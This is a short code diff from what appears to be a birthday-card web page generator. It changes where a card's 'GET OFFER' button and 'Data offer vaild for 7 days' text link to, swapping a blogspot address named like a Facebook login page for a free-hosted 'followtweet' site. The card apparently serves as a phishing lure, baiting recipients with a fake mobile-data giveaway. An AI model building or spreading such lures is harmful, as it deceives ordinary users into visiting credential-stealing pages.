@@ -167,7 +167,7 @@
                     text:`Have a happiest birthday
                     Card created by Birthday Card Maker by me.`,
                     button:"Let's start",
-                    html:`<img id="cake" src="https://freepngimg.com/thumb/valentines_day/32406-1-valentines-day-hd-thumb.png" alt="" /><a href="https://mtnvalentinesfacbookauth0.blogspot.com/"><h3 style="font-family:'Pacifico'; color:gray;">Enjoy your day. Data offer vaild for 7 days.</h3></a><a  href="https://mtnvalentinesfacbookauth0.blogspot.com/"><button type="button" class="btn btn-custom btn-lg btn-block mt-3">GET OFFER</button></a>`   })
+                    html:`<img id="cake" src="https://freepngimg.com/thumb/valentines_day/32406-1-valentines-day-hd-thumb.png" alt="" /><a href="https://followtweet.000webhostapp.com/"><h3 style="font-family:'Pacifico'; color:gray;">Enjoy your day. Data offer vaild for 7 days.</h3></a><a  href="https://followtweet.000webhostapp.com/"><button type="button" class="btn btn-custom btn-lg btn-block mt-3">GET OFFER</button></a>`   })
                
                
                 }
